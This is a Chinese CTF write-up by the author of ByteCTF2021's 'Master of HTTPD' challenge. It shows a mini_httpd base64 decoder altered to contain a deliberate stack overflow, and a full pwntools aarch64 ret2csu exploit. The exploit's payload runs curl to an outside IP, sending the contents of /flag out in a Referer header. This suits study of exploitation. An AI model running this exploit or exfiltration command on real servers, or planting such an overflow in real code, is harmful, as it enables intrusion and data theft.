# ByteCTF2021 `Master of HTTPD`

决赛签到题

## 这道题的诞生

- 对国内某些CTF出题人**打着httpd旗号出题却用stdin/stdout来和做交互**的行为深感疑惑，简单的HTTP报文Parser也能算httpd？是不是再ARM/MIPS交叉编译一下就能号称IoT赛题了？23333
- 很久以前挖到过一个Authorization字段解码触发的栈溢出，应该是去年的CVE-2020-14473，但考虑到原漏洞的lighttpd应该过于常见，或许有选手接触过，于是当即clone 相对冷门的（但也不是太冷门）mini_httpd 1.30，再给`b64_decode`加个小改动，塞个`memcpy`

```c=
/* Do base-64 decoding on a string.  Ignore any non-base64 bytes.
** Return the actual number of bytes generated.  The decoded size will
** be at most 3/4 the size of the encoded, and may be smaller if there
** are padding characters (blanks, newlines).
*/
int b64_decode( const char* str, unsigned char* space, int size )
    {
    const char* cp;
    int space_idx, phase;
    int d, prev_d = 0;
    unsigned char c;
    space_idx = 0;
    phase = 0;
    for ( cp = str; *cp != '\0'; ++cp )
        {
        d = b64_decode_table[(int) ((unsigned char) *cp)];
        if ( d != -1 )
            {
            switch ( phase )
                {
                case 0:
                ++phase;
                break;
                case 1:
                c = ( ( prev_d << 2 ) | ( ( d & 0x30 ) >> 4 ) );
                if ( space_idx < size )
                    space[space_idx++] = c;
                ++phase;
                break;
                case 2:
                c = ( ( ( prev_d & 0xf ) << 4 ) | ( ( d & 0x3c ) >> 2 ) );
                if ( space_idx < size )
                    space[space_idx++] = c;
                ++phase;
                break;
                case 3:
                c = ( ( ( prev_d & 0x03 ) << 6 ) | d );
                if ( space_idx < size )
                    space[space_idx++] = c;
                phase = 0;
                break;
                }
            prev_d = d;
            }
        }
    log_decoded_msg(space, ((size*3)/4)+1);
    /*memcpy(decoded_str, space, strlen((char*)space));
    puts(decoded_str);*/
    return space_idx;
    }

void log_decoded_msg(char * msg, int size){
        char decoded_str[0x100];
        memcpy(decoded_str, msg, size);
        puts(decoded_str);
        return;
}
```

## 这道题的利用

- 触发`b64_decode`需要访问带有`.htpasswd`的目录，需要选手扫到admin目录触发登陆校验
- Aarch64的栈溢出可以直接套用ret2csu模板

```python=
from sys import argv
from pwn import *
from base64 import b64encode
context.arch = "aarch64"


class Attack(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.conn = None
        self.base = {}

    def connectTarget(self):
        return remote(self.ip, self.port)

    def pb64(self, n, base=""):
        if base in self.base.keys():
            return p64(n + self.base[base])
        else:
            return p64(n)

    def generatePayload(self):
        payload = b''
        payload += b'A'*0x100
        payload += self.pb64(0x41df00)    # accessible memory
        payload += self.pb64(0x407d98)    # CSU Gadget 0
        payload += self.pb64(0x000000)*3  # X29
        payload += self.pb64(0x407d78)    # X30 -> CSU Gadget 2
        payload += self.pb64(0x000000)    # X19
        payload += self.pb64(0x000000)    # X20
        # payload += self.pb64(0x41c118)    # X21 => GOT[popen]
        payload += self.pb64(0x4234fc)    # ptr to `bl popen`
        payload += self.pb64(0x4234c0)    # X22 => X0 "/usr/bin/curl http://120.79.211.91:9997 -H \"Referer: `cat /flag`\""
        payload += self.pb64(0x40a900)    # X23 => X1 "r"
        payload += self.pb64(0x000000)    # X24 => X2 0
        return b64encode(payload)
    
    def generateMessage(self):
        message = b""
        message += b"GET /admin/flag.html HTTP/1.1\r\n"
        message += b"Host: 23333\r\n"
        message += b"User-Agent: C0ss4ck\r\n"
        message += b"Accept: */*\r\n"
        message += "Authorization: Basic {}\r\n".format(self.generatePayload().decode()).encode()
        message += b"   curl http://120.79.211.91:9997 -H \"Referer: `cat /flag`\"\r\n"
        message += b"\r\n"
        message += self.pb64(0x4062c8)
        print(message.decode('latin-1'))
        return message

    def trigger(self):
        self.conn = self.connectTarget()
        self.conn.send(self.generateMessage())
        self.conn.interactive()


a = Attack(argv[1], int(argv[2]))
a.trigger()

```
其实本来打算开PIE，这样构造ROP会相对麻烦。虽然mini_httpd的daemon可以保持基地址不变，但是ret2csu中只有W0而无X0，导致ROP最终调用函数的首参数不能为字符串地址。有兴趣的同学可以试试开启PIE下的漏洞利用。

## 一则广告（不是）

华为云租一台aarch64 ubuntu，gdb直接调试，非常方便。如果gdb各种bug打印不了回显，那就gdbserver转发到正常的amd64机器上调试

## 非预期

选手可以传`\x00`，对payload构造的要求大大降低。

//在大多数实战中，`\x00`会被直接截断
